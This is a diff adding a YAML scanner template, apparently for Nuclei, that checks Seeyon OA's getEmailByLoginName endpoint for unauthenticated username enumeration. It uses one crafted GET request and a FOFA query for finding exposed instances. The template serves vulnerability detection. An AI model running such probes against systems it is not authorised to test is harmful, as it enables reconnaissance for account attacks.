@@ -1,0 +1,31 @@
+id: seeyon-oa-getemailbyloginname-username-enum
+
+info:
+  name: Seeyon OA getEmailByLoginName - Username Enumeration
+  author: qwtd
+  severity: low
+  description: |
+    Seeyon OA getEmailByLoginName endpoint allows unauthenticated users to retrieve and send usernames.
+  reference:
+    - https://mp.weixin.qq.com/s/UA7zYmqYkpZJsXH4upmZxA
+  metadata:
+    fofa: app="致远互联-OA"
+    max-request: 1
+    verified: true
+  tags: 致远互联-OA
+
+http:
+  - raw:
+      - |
+        GET /seeyon/rest/password/retrieve/getEmailByLoginName/admin1 HTTP/1.1
+        Host: {{Hostname}}
+      
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '未设置有效邮箱'
+          - '无效的人员'
+      - type: status
+        status:
+          - 200
